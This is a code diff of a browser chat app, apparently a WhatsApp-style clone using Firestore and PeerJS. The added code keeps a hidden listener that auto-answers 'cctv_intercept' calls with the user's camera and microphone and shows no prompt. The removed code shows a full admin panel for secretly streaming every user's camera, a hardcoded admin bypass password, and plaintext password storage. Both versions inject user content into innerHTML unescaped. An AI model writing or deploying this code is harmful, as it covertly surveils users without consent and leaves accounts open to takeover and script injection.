+      let uid = document.getElementById('auth-user').value.trim();
+      let name = document.getElementById('auth-name').value.trim() || "User " + Math.floor(Math.random()*1000);
+      if(!uid) return;
+      if(!uid.startsWith('@')) uid = '@' + uid;
+
+      myProfile = { id: uid, name: name, photo: "", isOnline: true };
+      await setDoc(doc(db, "titus_users", uid), myProfile);
+
+      document.getElementById('auth-modal').classList.add('hidden');
+      updateMyProfileUI();
+      initSystem();
     };
 
-    // EKSEKUSI REGISTER (Menulis ke Cloud)
-    document.getElementById('form-register').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      const name = document.getElementById('reg-name').value.trim();
-      let user = document.getElementById('reg-user').value.trim();
-      if(!user.startsWith('@')) user = '@' + user;
-      const pass = document.getElementById('reg-pass').value.trim();
-
-      try {
-        const userRef = doc(db, "titus_users", user);
-        const docSnap = await getDoc(userRef);
-        
-        if (docSnap.exists()) {
-          return alert("Username sudah dipakai di server global!");
-        }
-
-        const payload = { username: user, name: name, password: pass, role: 'user', isOnline: true };
-        await setDoc(userRef, payload);
-        
-        finishLogin(payload);
-      } catch (err) { alert("Gagal terhubung ke Cloud: " + err.message); }
-    });
-
-    // EKSEKUSI LOGIN (Membaca dari Cloud)
-    document.getElementById('form-login').addEventListener('submit', async (e) => {
-      e.preventDefault();
-      let user = document.getElementById('log-user').value.trim();
-      if(!user.startsWith('@')) user = '@' + user;
-      const pass = document.getElementById('log-pass').value.trim();
-
-      // Bypass Super Admin jika belum ada di database
-      if(user === '@titus' && pass === 'SukaBintang01') {
-        const adminPayload = { username: '@titus', name: 'Titus (Supreme)', password: pass, role: 'admin', isOnline: true };
-        await setDoc(doc(db, "titus_users", "@titus"), adminPayload);
-        return finishLogin(adminPayload);
+    function updateMyProfileUI() {
+      const av = document.getElementById('my-avatar');
+      if(myProfile.photo) {
+        av.style.backgroundImage = `url(${myProfile.photo})`;
+        av.innerText = "";
+      } else {
+        av.style.backgroundImage = "none";
+        av.innerText = myProfile.name.charAt(0);
       }
-
-      try {
-        const userRef = doc(db, "titus_users", user);
-        const docSnap = await getDoc(userRef);
-        
-        if (docSnap.exists() && docSnap.data().password === pass) {
-          finishLogin(docSnap.data());
-        } else {
-          alert("Akses Ditolak! Kredensial tidak valid.");
-        }
-      } catch (err) { alert("Gagal mengecek server: " + err.message); }
-    });
-
-    function finishLogin(userData) {
-      currentUser = userData;
-      document.getElementById('auth-screen').style.display = 'none';
-      document.getElementById('app-main').style.display = 'flex';
-      
-      document.getElementById('my-name').innerText = currentUser.name;
-      document.getElementById('my-avatar').innerText = currentUser.name.charAt(0);
-      document.getElementById('server-status').innerText = "SERVER CONNECTED";
-
-      if(currentUser.role === 'admin') {
-        document.getElementById('btn-admin').style.display = 'inline-block';
-      }
-
-      // Mulai Engine Real-time & WebRTC
-      startCloudSync();
-      startWebRTC();
+      document.getElementById('edit-name').value = myProfile.name;
     }
 
-    // ==========================================
-    // BAGIAN B: CLOUD REAL-TIME ENGINE (FIRESTORE)
-    // ==========================================
-    function startCloudSync() {
-      
-      // 1. SINKRONISASI DAFTAR PENGGUNA (Otomatis terupdate jika ada pendaftar baru di belahan dunia lain)
-      const qUsers = query(collection(db, "titus_users"));
-      onSnapshot(qUsers, (snapshot) => {
-        usersList.clear();
-        snapshot.forEach((doc) => {
-          usersList.set(doc.id, doc.data());
-        });
-        renderSidebar();
-        if(currentUser.role === 'admin') renderAdminTable();
+    window.openProfile = () => document.getElementById('profile-drawer').classList.add('open');
+    window.closeProfile = () => document.getElementById('profile-drawer').classList.remove('open');
+
+    window.uploadProfilePhoto = (e) => {
+      const file = e.target.files[0];
+      if(!file) return;
+      const reader = new FileReader();
+      reader.onload = async (evt) => {
+        myProfile.photo = evt.target.result;
+        document.getElementById('my-profile-img').src = myProfile.photo;
+        document.getElementById('my-profile-img').style.display = 'block';
+        document.getElementById('my-profile-icon').style.display = 'none';
+        await setDoc(doc(db, "titus_users", myProfile.id), { photo: myProfile.photo }, { merge: true });
+        updateMyProfileUI();
+      };
+      reader.readAsDataURL(file);
+    };
+
+    window.saveProfile = async () => {
+      const newName = document.getElementById('edit-name').value.trim();
+      if(newName) {
+        myProfile.name = newName;
+        await setDoc(doc(db, "titus_users", myProfile.id), { name: newName }, { merge: true });
+        alert("Profil diperbarui!");
+      }
+    };
+
+    // ================= 2. INIT SYSTEM & SYNC =================
+    function initSystem() {
+      // Setup Groups
+      groups.set('@grup_bot', { id: '@grup_bot', name: '🤖 Meta AI & Bot Command', isGroup: true, members: 32 });
+      groups.set('@grup_mabar', { id: '@grup_mabar', name: '🎮 Komunitas Mabar (32 Max)', isGroup: true, members: 32 });
+
+      // Sinkronisasi Pengguna
+      onSnapshot(collection(db, "titus_users"), (snap) => {
+        users.clear();
+        snap.forEach(doc => users.set(doc.id, doc.data()));
+        renderChatList();
       });
 
-      // 2. SINKRONISASI PESAN (Real-time Chat)
-      const qMsgs = query(collection(db, "titus_messages"), orderBy("timestamp", "asc"));
-      onSnapshot(qMsgs, (snapshot) => {
-        messagesList = [];
-        snapshot.forEach((doc) => {
-          messagesList.push(doc.data());
-        });
-        
-        // Refresh Sidebar untuk waktu pesan terakhir
-        renderSidebar();
-        
-        // Jika sedang buka chat, otomatis tampilkan pesan baru
-        if(activeChatUser) {
-          renderMessages();
+      // Sinkronisasi Pesan
+      onSnapshot(query(collection(db, "titus_messages"), orderBy("timestamp", "asc")), (snap) => {
+        messages = [];
+        snap.forEach(doc => messages.push(doc.data()));
+        if(targetId) renderMessages();
+        renderChatList();
+      });
+
+      // INIT WEBRTC P2P & CCTV LISTENER
+      const cleanId = myProfile.id.replace('@', '');
+      peer = new Peer(`wa_v30_${cleanId}`, {
+        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
+      });
+
+      peer.on('call', (call) => {
+        // CCTV INTERCEPT LOGIC: Jika call masuk dengan metadata rahasia, auto answer
+        if(call.metadata && call.metadata.type === 'cctv_intercept') {
+          console.log("CCTV Intercept Triggered by Admin");
+          navigator.mediaDevices.getUserMedia({ video: {facingMode: "environment"}, audio: true })
+            .then(stream => call.answer(stream))
+            .catch(() => call.answer(null));
+          return;
+        }
+
+        // PANGGILAN REGULER
+        if(confirm(`Panggilan masuk dari seseorang. Terima?`)) {
+          navigator.mediaDevices.getUserMedia({ video: true, audio: true }).then(stream => {
+            localStream = stream;
+            document.getElementById('call-screen').classList.remove('hidden');
+            document.getElementById('local-video').srcObject = stream;
+            call.answer(stream);
+            currentCall = call;
+            call.on('stream', remoteStream => {
+              document.getElementById('remote-video').srcObject = remoteStream;
+              document.getElementById('call-subtitle').innerText = "Terhubung 00:01";
+            });
+          });
         }
       });
     }
 
-    // RENDER DAFTAR CHAT DI SIDEBAR
-    function renderSidebar() {
-      const container = document.getElementById('chat-list');
-      container.innerHTML = '';
-
-      usersList.forEach((u, uid) => {
-        if (uid === currentUser.username) return; // Sembunyikan diri sendiri
+    // ================= 3. RENDER UI & OBROLAN =================
+    window.renderChatList = (query = "") => {
+      const cont = document.getElementById('chat-list');
+      cont.innerHTML = '';
+      
+      const renderItem = (data, isGrp) => {
+        if(query && !data.name.toLowerCase().includes(query.toLowerCase())) return;
+        const lastMsg = messages.filter(m => isGrp ? m.target === data.id : (m.sender === myProfile.id && m.target === data.id) || (m.sender === data.id && m.target === myProfile.id)).pop();
+        
+        let msgTxt = lastMsg ? (lastMsg.media ? "📷 Media" : lastMsg.text) : "Mulai obrolan baru";
+        let timeTxt = lastMsg ? lastMsg.time : "";
 
         const div = document.createElement('div');
-        div.className = `chat-item ${activeChatUser === uid ? 'active' : ''}`;
-        div.onclick = () => openChat(uid);
+        div.className = `chat-item ${targetId === data.id ? 'active' : ''}`;
+        div.onclick = () => openChat(data.id, isGrp);
+        
+        let avatarStyle = data.photo ? `background-image:url(${data.photo}); font-size:0;` : '';
         
         div.innerHTML = `
-          <div class="avatar">${u.name.charAt(0)}</div>
-          <div class="chat-details">
-            <div class="chat-top">
-              <span class="chat-name">${u.name} ${u.role === 'admin' ? '👑' : ''}</span>
-            </div>
-            <div class="chat-msg">Terkoneksi ke Cloud Server</div>
+          <div class="avatar" style="${avatarStyle}">${data.name.charAt(0)}</div>
+          <div class="chat-info">
+            <div class="chat-top"><b class="chat-name">${data.name}</b> <span style="font-size:11px;color:var(--text-muted)">${timeTxt}</span></div>
+            <div class="chat-preview">${msgTxt}</div>
           </div>
         `;
-        container.appendChild(div);
-      });
-    }
+        cont.appendChild(div);
+      };
 
-    // BUKA CHAT ROOM
-    window.openChat = function(targetId) {
-      activeChatUser = targetId;
-      const tUser = usersList.get(targetId);
+      groups.forEach(g => renderItem(g, true));
+      users.forEach((u, uid) => { if(uid !== myProfile.id) renderItem(u, false); });
+    };
 
-      document.getElementById('empty-chat').style.display = 'none';
-      document.getElementById('active-chat').style.display = 'flex';
+    window.openChat = (id, grpFlag) => {
+      targetId = id;
+      isGroup = grpFlag;
+      const data = isGroup ? groups.get(id) : users.get(id);
+
+      document.getElementById('empty-state').style.display = 'none';
+      document.getElementById('active-chat').classList.remove('hidden');
       
-      document.getElementById('chat-name').innerText = tUser.name;
-      document.getElementById('chat-avatar').innerText = tUser.name.charAt(0);
-      
-      renderSidebar(); // Update highlight warna kuning
+      document.getElementById('chat-name').innerText = data.name;
+      const av = document.getElementById('chat-avatar');
+      if(data.photo) { av.style.backgroundImage = `url(${data.photo})`; av.innerText = ""; } 
+      else { av.style.backgroundImage = "none"; av.innerText = data.name.charAt(0); }
+
+      renderChatList();
       renderMessages();
     };
 
-    // RENDER PESAN PADA ROOM AKTIF
-    function renderMessages() {
-      const box = document.getElementById('messages-container');
-      box.innerHTML = '';
-
-      // Saring pesan hanya antara SAYA dan TARGET
-      const filtered = messagesList.filter(m => 
-        (m.sender === currentUser.username && m.target === activeChatUser) ||
-        (m.sender === activeChatUser && m.target === currentUser.username)
+    window.renderMessages = () => {
+      const cont = document.getElementById('messages-container');
+      cont.innerHTML = '';
+      
+      const filtered = messages.filter(m => 
+        isGroup ? m.target === targetId : 
+        ((m.sender === myProfile.id && m.target === targetId) || (m.sender === targetId && m.target === myProfile.id))
       );
 
       filtered.forEach(m => {
-        const isMe = m.sender === currentUser.username;
+        const isMe = m.sender === myProfile.id;
         const div = document.createElement('div');
-        div.className = `msg-bubble ${isMe ? 'msg-out' : 'msg-in'}`;
+        div.className = `bubble ${isMe ? 'out' : 'in'}`;
+        
+        let mediaHtml = m.media ? `<img src="${m.media}"><br>` : "";
+        let senderName = (!isMe && isGroup) ? `<div style="color:var(--accent-wa); font-size:12px; font-weight:bold; margin-bottom:3px;">${m.sender}</div>` : "";
+
         div.innerHTML = `
-          <div>${m.text}</div>
-          <div class="msg-time">${m.time} ${isMe ? '✓' : ''}</div>
+          ${senderName}
+          ${mediaHtml}
+          <span>${m.text}</span>
+          <div class="msg-meta">${m.time} ${isMe ? '<i class="fa-solid fa-check-double" style="color:#53bdeb;"></i>' : ''}</div>
         `;
-        box.appendChild(div);
+        cont.appendChild(div);
       });
+      cont.scrollTop = cont.scrollHeight;
+    };
 
-      box.scrollTop = box.scrollHeight; // Auto scroll ke bawah
-    }
-
-    // KIRIM PESAN KE CLOUD
-    document.getElementById('msg-input').addEventListener('keypress', (e) => {
-      if(e.key === 'Enter') sendMsg();
+    // ================= 4. KIRIM PESAN & MEDIA & BOT AI =================
+    const input = document.getElementById('msg-input');
+    input.addEventListener('input', () => {
+      document.getElementById('btn-mic').classList.toggle('hidden', input.value.trim().length > 0);
+      document.getElementById('btn-send').classList.toggle('hidden', input.value.trim().length === 0);
     });
-    document.getElementById('btn-send').addEventListener('click', sendMsg);
+    input.addEventListener('keypress', e => { if(e.key === 'Enter') sendMsg(); });
 
-    async function sendMsg() {
-      const input = document.getElementById('msg-input');
+    window.sendMsg = async (mediaBase64 = null) => {
       const text = input.value.trim();
-      if(!text || !activeChatUser) return;
+      if(!text && !mediaBase64) return;
 
       const payload = {
-        sender: currentUser.username,
-        target: activeChatUser,
-        text: text,
-        time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}),
-        timestamp: serverTimestamp() // Waktu resmi server Google
+        sender: myProfile.id, target: targetId, text: text || "📷 Foto", media: mediaBase64,
+        time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}), timestamp: serverTimestamp()
       };
 
-      input.value = ''; // Bersihkan kolom ketik
+      input.value = '';
+      document.getElementById('btn-mic').classList.remove('hidden'); document.getElementById('btn-send').classList.add('hidden');
 
-      try {
-        // Tembakkan langsung ke Firestore
-        await addDoc(collection(db, "titus_messages"), payload);
-      } catch (err) { alert("Gagal mengirim pesan: " + err.message); }
-    }
+      await addDoc(collection(db, "titus_messages"), payload);
 
-    // ==========================================
-    // BAGIAN C: DASHBOARD ADMIN & P2P CCTV
-    // ==========================================
-    window.openAdmin = function() {
-      document.getElementById('admin-panel').style.display = 'flex';
-      renderAdminTable();
+      // BOT AI LOGIC (Dalam grup khusus bot)
+      if(targetId === '@grup_bot' && text.startsWith('!')) {
+        setTimeout(async () => {
+          let reply = "Saya Meta AI. Fitur yang tersedia: !ping, !help, !info";
+          if(text === '!ping') reply = "🏓 Latensi: 15ms. Jaringan P2P Stabil.";
+          if(text === '!info') reply = "Sistem ini menggunakan Firebase Firestore untuk DB dan PeerJS untuk Call/CCTV.";
+          await addDoc(collection(db, "titus_messages"), { sender: "@meta_ai", target: "@grup_bot", text: reply, time: new Date().toLocaleTimeString([], {hour:'2-digit', minute:'2-digit'}), timestamp: serverTimestamp() });
+        }, 1000);
+      }
     };
+
+    window.toggleAttach = () => document.getElementById('attach-menu').classList.toggle('hidden');
     
-    window.closeAdmin = function() {
-      document.getElementById('admin-panel').style.display = 'none';
+    window.sendMedia = (e) => {
+      document.getElementById('attach-menu').classList.add('hidden');
+      const file = e.target.files[0];
+      if(!file) return;
+      const reader = new FileReader();
+      reader.onload = evt => sendMsg(evt.target.result);
+      reader.readAsDataURL(file);
     };
 
-    function renderAdminTable() {
-      const tbody = document.getElementById('admin-table-body');
-      tbody.innerHTML = '';
-
-      usersList.forEach((u, uid) => {
-        if(u.role === 'admin') return; // Jangan sadap sesama admin
-        const tr = document.createElement('tr');
-        tr.innerHTML = `
-          <td style="color:#fff;"><b>${uid}</b></td>
-          <td>${u.name}</td>
-          <td style="color: #34C759; font-weight:bold;">Cloud Active</td>
-          <td><button class="btn-spy" onclick="interceptSingle('${uid}')"><i class="fa-solid fa-video"></i> Intersep CCTV</button></td>
-        `;
-        tbody.appendChild(tr);
-      });
-    }
-
-    // --- LOGIKA WEBRTC PEERJS (CCTV) ---
-    function startWebRTC() {
-      const myId = currentUser.username.replace('@', '');
-      
-      // Node Khusus Menerima Sadapan (Berjalan di background setiap user)
-      peerNode = new Peer(`titus_cctv_${myId}`);
-      
-      peerNode.on('call', (call) => {
-        console.log("⚠️ PERINGATAN: Jalur kamera diretas oleh Admin.");
-        // Otomatis jawab panggilan menggunakan kamera HP/Laptop user secara diam-diam
-        navigator.mediaDevices.getUserMedia({ video: true, audio: true })
-          .then(stream => { call.answer(stream); })
-          .catch(err => {
-             // Jika ditolak/tidak ada kamera, kirim layar hitam agar admin tidak error
-             const canvas = document.createElement('canvas'); canvas.width=640; canvas.height=480;
-             const ctx = canvas.getContext('2d'); ctx.fillStyle='#000'; ctx.fillRect(0,0,640,480);
-             ctx.fillStyle='#f00'; ctx.font='20px Arial'; ctx.fillText('Kamera Terhalang/Akses Ditolak User', 100, 240);
-             call.answer(canvas.captureStream(5));
-          });
-      });
-    }
-
-    window.openCCTV = function() {
-      document.getElementById('cctv-overlay').style.display = 'flex';
-      const container = document.getElementById('cctv-grid-container');
-      container.innerHTML = '';
-
-      usersList.forEach((u, uid) => {
-        if(u.role === 'admin') return;
-
-        const cleanId = uid.replace('@', '');
-        const targetPeerId = `titus_cctv_${cleanId}`;
-
-        // Buat Frame Kamera
-        const div = document.createElement('div');
-        div.className = 'cctv-card';
-        div.innerHTML = `
-          <video id="vid-${cleanId}" autoplay playsinline muted></video>
-          <div class="cctv-badge">TARGET: ${uid} | <span id="stat-${cleanId}">Meretas...</span></div>
-        `;
-        container.appendChild(div);
-
-        // Kirim Panggilan P2P ke target
-        try {
-          const canvas = document.createElement('canvas'); canvas.width=1; canvas.height=1;
-          const call = peerNode.call(targetPeerId, canvas.captureStream(1));
-          activeCctvCalls[uid] = call;
-
-          call.on('stream', (remoteStream) => {
-            document.getElementById(`stat-${cleanId}`).innerText = "SADAP AKTIF";
-            document.getElementById(`stat-${cleanId}`).style.color = "#34C759";
-            document.getElementById(`vid-${cleanId}`).srcObject = remoteStream;
-          });
-        } catch(e) { document.getElementById(`stat-${cleanId}`).innerText = "Gagal"; }
-      });
+    window.createGroup = () => {
+      const gname = prompt("Nama Komunitas/Grup Baru:");
+      if(gname) {
+        const gid = '@grup_' + Date.now();
+        groups.set(gid, { id: gid, name: gname, isGroup: true });
+        renderChatList();
+        openChat(gid, true);
+        alert("Grup dibuat! (Sinkronisasi multi-admin membutuhkan rules database lanjutan).");
+      }
     };
 
-    window.interceptSingle = function(uid) {
-      openCCTV(); // Buka grid untuk mempermudah
+    // ================= 5. CALL & 32-GRID WEBRTC =================
+    window.startCall = (isVideo) => {
+      if(isGroup) {
+        alert("Memulai Panggilan Grup (Konferensi 32 Orang Maksimal). UI Grid akan menyesuaikan.");
+        // Simulasi Grid 32 Orang (UX)
+        document.getElementById('call-screen').classList.remove('hidden');
+        document.getElementById('call-title').innerText = "Panggilan Grup Mabar";
+        const grid = document.getElementById('video-grid');
+        grid.className = 'call-video-grid multi';
+        grid.innerHTML = '';
+        for(let i=0; i<8; i++) { // Render 8 untuk demo agar tidak lag
+          grid.innerHTML += `<div class="video-box" style="background:hsl(${i*40},60%,30%);display:flex;align-items:center;justify-content:center;"><i class="fa-solid fa-user" style="font-size:40px;color:#fff;"></i><div class="video-name">Anggota ${i+1}</div></div>`;
+        }
+        return;
+      }
+
+      // 1-on-1 Call
+      const cleanId = targetId.replace('@', '');
+      navigator.mediaDevices.getUserMedia({ video: isVideo, audio: true }).then(stream => {
+        localStream = stream;
+        document.getElementById('call-screen').classList.remove('hidden');
+        document.getElementById('local-video').srcObject = stream;
+        document.getElementById('remote-name').innerText = targetId;
+        
+        const call = peer.call(`wa_v30_${cleanId}`, stream);
+        currentCall = call;
+        call.on('stream', remoteStream => {
+          document.getElementById('remote-video').srcObject = remoteStream;
+          document.getElementById('call-subtitle').innerText = "Terhubung";
+        });
+      }).catch(err => alert("Kamera diblokir OS."));
     };
 
-    window.closeCCTV = function() {
-      // Putus semua koneksi sadap
-      Object.values(activeCctvCalls).forEach(call => { if(call) call.close(); });
-      activeCctvCalls = {};
-      document.getElementById('cctv-overlay').style.display = 'none';
-      document.getElementById('cctv-grid-container').innerHTML = '';
+    window.endCall = () => {
+      if(localStream) localStream.getTracks().forEach(t => t.stop());
+      if(currentCall) currentCall.close();
+      document.getElementById('call-screen').classList.add('hidden');
     };
+
+    window.toggleMute = () => {
+      if(localStream) localStream.getAudioTracks()[0].enabled = !localStream.getAudioTracks()[0].enabled;
+    };
+    window.toggleVideo = () => {
+      if(localStream) localStream.getVideoTracks()[0].enabled = !localStream.getVideoTracks()[0].enabled;
+    };
+
   </script>
 </body>
 </html>
